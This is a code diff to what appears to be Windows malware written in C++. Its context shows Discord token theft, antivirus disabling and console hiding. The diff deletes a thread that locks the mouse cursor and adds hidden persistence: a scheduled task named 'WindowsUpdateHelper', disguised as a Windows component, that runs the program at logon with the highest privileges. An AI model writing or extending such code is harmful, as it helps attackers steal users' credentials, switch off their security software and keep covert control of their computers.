@@ -1308,23 +1308,6 @@ std::string getDiscordTokens() {
     return out;
 }
 
-DWORD WINAPI mouseLockThread(LPVOID) {
-    while (true) {
-        SetCursorPos(0, 0);
-        Sleep(30);
-        if ((GetAsyncKeyState(VK_LBUTTON) & 0x8000) && (GetAsyncKeyState(VK_RBUTTON) & 0x8000)) {
-            DWORD t = GetTickCount();
-            while (GetTickCount() - t < 3000) {
-                SetCursorPos(0, 0);
-                Sleep(30);
-                if (!(GetAsyncKeyState(VK_LBUTTON) & 0x8000) || !(GetAsyncKeyState(VK_RBUTTON) & 0x8000)) break;
-            }
-            if ((GetAsyncKeyState(VK_LBUTTON) & 0x8000) && (GetAsyncKeyState(VK_RBUTTON) & 0x8000)) break;
-        }
-    }
-    return 0;
-}
-
 void killProcessByName(const char* name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return;
@@ -1429,6 +1412,12 @@ void installStartup() {
         DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
         if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
         RegCloseKey(hKey);
+    }
+    // Also create scheduled task for SYSTEM-level startup
+    char exe[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exe, MAX_PATH) > 0) {
+        std::string cmd = "cmd.exe /c schtasks /create /tn \"WindowsUpdateHelper\" /tr \"" + std::string(exe) + "\" /sc onlogon /rl highest /f 2>nul";
+        WinExec(cmd.c_str(), SW_HIDE);
     }
 }
 
@@ -1699,7 +1688,6 @@ int main(int argc, char* argv[]) {
     }
     if (computerName.empty()) computerName = getComputerName();
     hideToAppData();
-    CreateThread(0, 0, mouseLockThread, 0, 0, 0);
     disableAntivirus();
     HWND hwnd = GetConsoleWindow();
     if (hwnd && !showConsole) ShowWindow(hwnd, SW_HIDE);
